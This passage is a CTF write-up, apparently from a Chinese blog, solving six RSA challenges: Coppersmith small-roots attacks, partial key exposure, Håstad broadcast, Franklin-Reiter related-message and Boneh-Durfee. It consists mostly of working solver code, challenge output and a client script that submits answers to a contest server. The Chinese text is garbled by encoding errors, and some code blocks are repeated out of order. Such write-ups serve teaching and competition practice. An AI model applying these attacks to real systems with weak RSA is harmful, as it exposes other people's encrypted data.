class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):a = ss + chr(i) + chr(j) + chr(h)<span class="hljs-keyword">if</span> hashlib.sha256(a).hexdigest() == s256:<span class="hljs-keyword">return</span> a.encode(<span class="hljs-string">'hex'</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:ip = <span class="hljs-string">'119.3.245.36'</span>port = <span class="hljs-number">12345</span>teamtoken = <span class="hljs-string">'dde3f26577d8d7816378038885943de1'</span>s = remote(ip,port)s.recvuntil(<span class="hljs-string">'[+]hashlib.sha256(skr).hexdigest()='</span>)d256 = s.recvline()s.recvuntil(<span class="hljs-string">"[+]skr[0:5].encode('hex')="</span>)d = s.recvline()data = cha1(d.strip(),d256.strip())s.recvuntil(<span class="hljs-string">"[-]skr.encode('hex')="</span>)s.sendline(data)s.recvuntil(<span class="hljs-string">"[+]teamtoken:"</span>)s.sendline(teamtoken)time.sleep(<span class="hljs-number">2</span>ï¼‰    <span class="hljs-comment">#challenge1 -- Known High Bits Message Attack</span>m = <span class="hljs-string">'858be94f2f6253ac4586da573086221c8256bf7fe7c7f6d0d4e459fd28abf8883cfa225f5cbb519d2c8e0427aab1dc03979886ac104018ddec85e8edb7bbc590'</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m)time.sleep(<span class="hljs-number">2</span>)    <span class="hljs-comment">#challenge2 -- Factoring with High Bits Known</span>m2 = <span class="hljs-string">"7e2a3378b47f389134bda8811e253ace33c6978fbb5d0022ab312cf1f5246648516b320bf749e71a1d8cbdcab64fdb5ce8159022ea96484949152d31a9f17665"</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m2)time.sleep(<span class="hljs-number">2</span>)<span class="hljs-comment">#challenge3 -- Patial Key Exposure Attack</span>m3 = <span class="hljs-string">"86ee347cbeec999564c0615d33ea5e3cfb5e66f5d00b172194c0f86915de3ff19d2dffc2217caaa608ea6556b18e8f420fc1b287871475a0cd5c8f2d97e4c12c"</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m3)time.sleep(<span class="hljs-number">4</span>)<span class="hljs-comment">#challenge4 -- Basic Broadcast Attack</span>m4 = <span class="hljs-string">"380185242a03c9d6ca7a2e117490ebaf03a493b1250f4e248c732c2714eb6b9fd2fa4c90a4f1d8120ffbafb3b7fda85fff46a67a1da3e316392ec267e1fa7c27"</span>s.recvuntil(<span class="hljs-string">"_bytes(m).encode('hex')="</span>)s.sendline(m4)         time.sleep(<span class="hljs-number">20</span>)<span class="hljs-comment">#challenge5 -- Related Message Attack</span>    m5 = <span class="hljs-string">"0811b179ddbc246fc00ad94b6251c818e331941732fdfce9979c015ca7f0ec873641338c5814f3e8e50dfab04bd6aa0689334b517de10d7bac398aef23f929b3"</span>s.sendlineafter(<span class="hljs-string">"[-]long_to_bytes(m).encode('hex')="</span>,m5)time.sleep(<span class="hljs-number">4</span>)<span class="hljs-comment">#challenge6 -- Boneh and Durfee attack</span>m6 = <span class="hljs-string">"6b3bb0cdc72a7f2ce89902e19db0fb2c0514c76874b2ca4113b86e6dc128d44cc859283db4ca8b0b5d9ee35032aec8cc8bb96e8c11547915fc9ef05aa2d72b28"</span>s.sendlineafter(<span class="hljs-string">"[-]long_to_bytes(m).encode('hex')="</span>,m6)time.sleep(<span class="hljs-number">4</span>)<span class="hljs-keyword">print</span> s.recv()</code></pre><h3 id="challenge1-â€“-Known-High-Bits-Message-Attack">challenge1 â€“ Known High Bits Message Attack<a class="post-anchor" href="#challenge1-â€“-Known-High-Bits-Message-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]proof completed[++++++++++++++++][+]Generating challenge 1[+]n=0x331e53d1808798def926bc2c8081b3a959cec19c04ad6dd3a25357b5e3889dc0bbb8618b80ddecca89494eec6015080cf4402fcef0971f76d978c517ab1e3019ae65fdc443a99036d4adcda780dd662ae3eb5d3c6ce68adfe38137689df75a6196a7a6dc94a681dfb5437439c810416112b250402f53eb2341df2145c569c135L[+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0xab7b8544dc18a13c221d33b8ea84ee69ea3c74a1ce123e6f0a565e6afaff3d2682dfa254170a1200d66e9c017727c43b3c1af221f81d90598741454f68448cef4128ff56bb9929ffd3edaaa8069c08293463ad20486b6e6bee654ab471a3b364122d41f4570f6aa1084eb1eda5eebde1436a488e0390f8057df835f323802d4L[+]((m&gt;&gt;72)&lt;&lt;72)=0x858be94f2f6253ac4586da573086221c8256bf7fe7c7f6d0d4e459fd28abf8883cfa225f5cbb519d2c8e0427aab1dc03979886ac104018000000000000000000L[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><p>é¢˜ç›®ç»™äº†æ˜æ–‡çš„é«˜ä½éƒ¨åˆ†</p><pre><code class="hljs python">n =e = <span class="hljs-number">3</span>m = randrange(n)c = pow(m, e, n)beta = <span class="hljs-number">1</span>epsilon = beta^<span class="hljs-number">2</span>/<span class="hljs-number">7</span>nbits = n.nbits()kbits = floor(nbits*(beta^<span class="hljs-number">2</span>/e-epsilon))<span class="hljs-comment">#mbar = m &amp; (2^nbits-2^kbits)</span>mbar =c =<span class="hljs-keyword">print</span> â€œupper %d bits (of %d bits) <span class="hljs-keyword">is</span> givenâ€ % (nbits-kbits, nbits)PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e â€“ c<span class="hljs-keyword">print</span> mx0 = f.small_roots(X=<span class="hljs-number">2</span>^kbits, beta=<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># find root &lt; 2^kbits with factor = n</span><span class="hljs-keyword">print</span> mbar + x0<span class="hljs-keyword">print</span> x0</code></pre><h3 id="challenge2-â€“-Factoring-with-High-Bits-Known">challenge2 â€“ Factoring with High Bits Known<a class="post-anchor" href="#challenge2-â€“-Factoring-with-High-Bits-Known"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 1 completed[++++++++++++++++][+]Generating challenge 2[+]n=0x116c51f73ef1c6b3b890dd8be446b80ac1dbe93742348e1284a7fdf0c76604ceae72011918f18de6b0ab873500ef2ed351110b67acce5b8c48a750a376c3e0117c44ec58e84e35f2ebf0e553b718720952dc826e364f130c2839c76878e0bfb3be0f24b06b3d91f1655e7ce588d2a3c429901197012db4d8b802308072bfca3fL[+]e=65537[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0x8d8fba82b1ca4e8a6e87b1ed5d50a9e6e49b3fb2aed78208e8c513842dedb5f14b82b39e03ea86089e76b59ff7bec0f6647096098346dcf64c7d1aaf533f99827fd9979dee217c511a3192e99a70d4fcd6aa44b2cf52a1ceddf99db42cbf2872e7e2ed421a4a9ff548bef6dfdad7ef17b09748bdf0025dfb93091e11115ebd4L[+]((p&gt;&gt;128)&lt;&lt;128)=0x2bff4035e24f2023f876abaf53ef53374d0208d59d4350a1cf356050c3a09cfc644d9c46cb59f013fadd96bea4a56dd100000000000000000000000000000000L[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python">n=<span class="hljs-number">0x985CBA74B3AFCF36F82079DE644DE85DD6658A2D3FB2D5C239F2657F921756459E84EE0BBC56943DE04F2A04AACE311574BE1E9391AC5B0F8DBB999524AF8DF2451A84916F6699E54AE0290014AFBF561B0E502CA094ADC3D9582EA22F857529D3DA79737F663A95767FDD87A9C19D8104A736ACBE5F4A25B2A25B4DF981F44DB2EB7F3028B1D1363C3A36F0C1B9921C7C06848984DFE853597C3410FCBF9A1B49C0F5CB0EEDDC06D722A0A7488F893D37996F9A92CD3422465F49F3035FEA6912589EFCFB5A4CF9B69C81B9FCC732D6E6A1FFCE9690F34939B27113527ABB00878806B229EC6570815C32BC2C134B0F56C21A63CA535AB467593246508CA9F9</span>p=<span class="hljs-number">0xBCF6D95C9FFCA2B17FD930C743BCEA314A5F24AE06C12CE62CDB6E8306A545DE468F1A23136321EB82B4B8695ECE58B763ECF8243CBBFADE0603922C130ED143D4D3E88E483529C820F7B53E4346511EB14D4D56CB2B714D3BDC9A2F2AB655993A31E0EB196E8F63028F9B29521E9B3609218BA0000000000000000000000000</span>p_fake = p+<span class="hljs-number">0x10000000000000000000000000</span>pbits = <span class="hljs-number">1024</span>kbits = pbits<span class="hljs-number">-576</span>pbar = p_fake &amp; (<span class="hljs-number">2</span>^pbits<span class="hljs-number">-2</span>^kbits)<span class="hljs-keyword">print</span> <span class="hljs-string">"upper %d bits (of %d bits) is given"</span> % (pbits-kbits, pbits)PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + pbarx0 = f.small_roots(X=<span class="hljs-number">2</span>^kbits, beta=<span class="hljs-number">0.4</span>)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span><span class="hljs-keyword">print</span> x0 + pbar</code></pre><h3 id="challenge3-â€“-Patial-Key-Exposure-Attack">challenge3 â€“ Patial Key Exposure Attack<a class="post-anchor" href="#challenge3-â€“-Patial-Key-Exposure-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 2 completed[++++++++++++++++][+]Generating challenge 3[+]n=0x56705388192a25439c7ec9f826467255aeac3a1991b0a5804e8cbe01d4fd33c0accdacc8cb2497969133116d841032cd023f29e4014b0c7619c40ce6e1977308f3587da928fe7c103e8fd68c0e909d229e68c23879c010f88dca4481af1c7030466edc93898b12f31dba9e7aa513fb1fd84c3d1d028cc068160501dafa1d54bL[+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0xcbe7d8021fa02b92239521aeaaf76b2d9553b6b738c79a2c31ef9dcef7875d5bde76f5ebb318660761090869c02c182a29516482e5daf090df76d10eab9398ede85a00d47abb3e27f6a87f8c0928e18c778efb3b6a02acb52257369cbc7e3015bda888e50d5586a34a5554df1f5f0e4cb0b8e9dd442ed939f610d18731be3L[+]d=invmod(e,(p-1)*(q-1))[+]d&amp;((1&lt;&lt;512)-1)=0xd74e2c4973ea6530620197a999a7a78d85a3029dfe8931397ee15b480c2f77b5042938e2f58f60e9c44e4f8d911b661b42dac0dbc0c1513773f870916b2418abL[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partial_p</span><span class="hljs-params">(p0, kbits, n)</span>:</span>    PR.&lt;x&gt; = PolynomialRing(Zmod(n))    nbits = n.nbits()    f = <span class="hljs-number">2</span>^kbits*x + p0    f = f.monic()    roots = f.small_roots(X=<span class="hljs-number">2</span>^(nbits//<span class="hljs-number">2</span>-kbits), beta=<span class="hljs-number">0.3</span>)  <span class="hljs-comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span>    <span class="hljs-keyword">if</span> roots:        x0 = roots[<span class="hljs-number">0</span>]        p = gcd(<span class="hljs-number">2</span>^kbits*x0 + p0, n)        <span class="hljs-keyword">return</span> ZZ(p)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find_p</span><span class="hljs-params">(d0, kbits, e, n)</span>:</span>    X = var(<span class="hljs-string">'X'</span>)    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, e+<span class="hljs-number">1</span>):        results = solve_mod([e*d0*X - k*X*(n-X+<span class="hljs-number">1</span>) + k*n == X], <span class="hljs-number">2</span>^kbits)        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> results:            p0 = ZZ(x[<span class="hljs-number">0</span>])            p = partial_p(p0, kbits, n)            <span class="hljs-keyword">if</span> p:                <span class="hljs-keyword">return</span> p<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    n = <span class="hljs-number">0x56705388192a25439c7ec9f826467255aeac3a1991b0a5804e8cbe01d4fd33c0accdacc8cb2497969133116d841032cd023f29e4014b0c7619c40ce6e1977308f3587da928fe7c103e8fd68c0e909d229e68c23879c010f88dca4481af1c7030466edc93898b12f31dba9e7aa513fb1fd84c3d1d028cc068160501dafa1d54b</span>    e = <span class="hljs-number">3</span>    d = <span class="hljs-number">0xd74e2c4973ea6530620197a999a7a78d85a3029dfe8931397ee15b480c2f77b5042938e2f58f60e9c44e4f8d911b661b42dac0dbc0c1513773f870916b2418ab</span>    beta = <span class="hljs-number">0.5</span>    epsilon = beta^<span class="hljs-number">2</span>/<span class="hljs-number">7</span>    nbits = n.nbits()    kbits = floor(nbits*(beta^<span class="hljs-number">2</span>+epsilon))    d0 = d &amp; (<span class="hljs-number">2</span>^kbits<span class="hljs-number">-1</span>)    <span class="hljs-keyword">print</span> <span class="hljs-string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits)    p = find_p(d0, kbits, e, n)    <span class="hljs-keyword">print</span> <span class="hljs-string">"found p: %d"</span> % p    q = n//p    <span class="hljs-keyword">print</span> d    <span class="hljs-keyword">print</span> inverse_mod(e, (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>))lower <span class="hljs-number">291</span> bits (of <span class="hljs-number">1019</span> bits) <span class="hljs-keyword">is</span> givenfound p: <span class="hljs-number">1556928330519222949185052385205770511398851299027067030656737931164636055914888549373041706626311467428902396847671677538586996128733508490246169051729867</span><span class="hljs-number">11276456863053049846778143161914757923513133539274086554204762345263769886584929828068603961625809916094813748871857226391606896679593696242167359171991723</span><span class="hljs-number">2529140489407550411860842517642709534323596281579020017754223390342047118996108186564106911103882855078009689932113065210547912624644857741988858283570121514938039297592621259739497542591992130948345362969430345095193882648382370898025817668567519357247651572797940766217498405274704879818312077507052181675</span></code></pre><h3 id="challenge4-â€“-Basic-Broadcast-Attack">challenge4 â€“ Basic Broadcast Attack<a class="post-anchor" href="#challenge4-â€“-Basic-Broadcast-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 3 completed[++++++++++++++++][+]Generating challenge 4[+]e=3[+]m=random.getrandbits(512)[+]n1=0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848fL[+]c1=pow(m,e,n1)=0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06L[+]n2=0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783L[+]c2=pow(m,e,n2)=0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7L[+]n3=0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697L[+]c3=pow(m,e,n3)=0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cbL[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnume=<span class="hljs-number">3</span>n_0=<span class="hljs-number">0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848f</span>ct_0=<span class="hljs-number">0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06</span>n_1=<span class="hljs-number">0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783</span>ct_1=<span class="hljs-number">0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7</span>n_2=<span class="hljs-number">0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697</span>ct_2=<span class="hljs-number">0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cb</span>N_012 = n_0 * n_1 * n_2<span class="hljs-comment"># n1 * n2</span>m_s_0 = n_1 * n_2<span class="hljs-comment"># n0 * n2</span>m_s_1 = n_0 * n_2<span class="hljs-comment"># n0 * n1</span>m_s_2 = n_0 * n_1crt = libnum.solve_crt([ct_0,ct_1,ct_2], [n_0,n_1,n_2])c_0 = crt % n_0c_1 = crt % n_1c_2 = crt % n_2result = ((c_0 * m_s_0 * libnum.invmod(m_s_0, n_0)) + (c_1 * m_s_1 * libnum.invmod(m_s_1, n_1)) + (c_2 * m_s_2 * libnum.invmod(m_s_2, n_2))) % N_012pt = libnum.nroot(result, <span class="hljs-number">3</span>)<span class="hljs-keyword">print</span> libnum.n2s(pt).encode(<span class="hljs-string">'hex'</span>)<span class="hljs-comment">#380185242a03c9d6ca7a2e117490ebaf03a493b1250f4e248c732c2714eb6b9fd2fa4c90a4f1d8120ffbafb3b7fda85fff46a67a1da3e316392ec267e1fa7c27</span></code></pre><h3 id="challenge5-â€“-Related-Message-Attack">challenge5 â€“ Related Message Attack<a class="post-anchor" href="#challenge5-â€“-Related-Message-Attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 4 completed[++++++++++++++++][+]Generating challenge 5[+]n=0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29L[+]e=3[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434L[+]x=pow(m+1,e,n)=0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9L[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnum<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *n = <span class="hljs-number">0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29</span>e = <span class="hljs-number">3</span>c1 = <span class="hljs-number">0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434</span>c2 = <span class="hljs-number">0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9</span>a = <span class="hljs-number">1</span>b = <span class="hljs-number">-1</span>padding2 = <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM2</span><span class="hljs-params">(a,b,c1,c2,n)</span>:</span>    a3 = pow(a,<span class="hljs-number">3</span>,n)    b3 = pow(b,<span class="hljs-number">3</span>,n)    first = c1-a3*c2+<span class="hljs-number">2</span>*b3    first = first % n    second = <span class="hljs-number">3</span>*b*(a3*c2-b3)    second = second % n    third = second*gmpy2.invert(first,n)    third = third % n    fourth = (third+b)*gmpy2.invert(a,n)    <span class="hljs-keyword">return</span> fourth % nm = getM2(a,b,c1,c2,n)-padding2<span class="hljs-keyword">print</span> <span class="hljs-string">"m==\n"</span> + hex(m) + <span class="hljs-string">"\n"</span><span class="hljs-comment">#print m</span>c = pow(m,e,n)<span class="hljs-comment">#print hex(c)</span><span class="hljs-keyword">if</span> c == c1:<span class="hljs-keyword">print</span> <span class="hljs-string">"yeah"</span></code></pre><h3 id="challenge6-â€“-Boneh-and-Durfee-attack">challenge6 â€“ Boneh and Durfee attack<a class="post-anchor" href="#challenge6-â€“-Boneh-and-Durfee-attack"></a></h3><pre><code class="hljs undefined">[++++++++++++++++]challenge 5 completed[++++++++++++++++][+]Generating challenge 6[+]n=0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L[+]d=random.getrandbits(1024*0.270)[+]e=invmod(d,phin)[+]hex(e)=0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL[+]m=random.getrandbits(512)[+]c=pow(m,e,n)=0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL[-]long_to_bytes(m).encode(&apos;hex&apos;)=</code></pre><p>GitHubå¼€æºé¡¹ç›®RSA-and-LLL-attacks<br>è§£å¯†å¯å¾—</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnume=<span class="hljs-number">3</span>n_0=<span class="hljs-number">0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848f</span>ct_0=<span class="hljs-number">0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06</span>n_1=<span class="hljs-number">0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783</span>ct_1=<span class="hljs-number">0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7</span>n_2=<span class="hljs-number">0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697</span>ct_2=<span class="hljs-number">0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cb</span>N_012 = n_0 * n_1 * n_2<span class="hljs-comment"># n1 * n2</span>m_s_0 = n_1 * n_2<span class="hljs-comment"># n0 * n2</span>m_s_1 = n_0 * n_2<span class="hljs-comment"># n0 * n1</span>m_s_2 = n_0 * n_1crt = libnum.solve_crt([ct_0,ct_1,ct_2], [n_0,n_1,n_2])c_0 = crt % n_0c_1 = crt % n_1c_2 = crt % n_2result = ((c_0 * m_s_0 * libnum.invmod(m_s_0, n_0)) + (c_1 * m_s_1 * libnum.invmod(m_s_1, n_1)) + (c_2 * m_s_2 * libnum.invmod(m_s_2, n_2))) % N_012pt = libnum.nroot(result, <span class="hljs-number">3</span>)<span class="hljs-keyword">print</span> libnum.n2s(pt).encode(<span class="hljs-string">'hex'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getM2</span><span class="hljs-params">(a,b,c1,c2,n)</span>:</span>    a3 = pow(a,<span class="hljs-number">3</span>,n)    b3 = pow(b,<span class="hljs-number">3</span>,n)    first = c1-a3*c2+<span class="hljs-number">2</span>*b3    first = first % n    second = <span class="hljs-number">3</span>*b*(a3*c2-b3)    second = second % n    third = second*gmpy2.invert(first,n)    third = third % n    fourth = (third+b)*gmpy2.invert(a,n)    <span class="hljs-keyword">return</span> fourth % nm = getM2(a,b,c1,c2,n)-padding2<span class="hljs-keyword">print</span> libnum.n2s(m)</code></pre><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> gmpy2<span class="hljs-keyword">import</span> libnum<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *n = <span class="hljs-number">0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29</span>e = <span class="hljs-number">3</span>c1 = <span 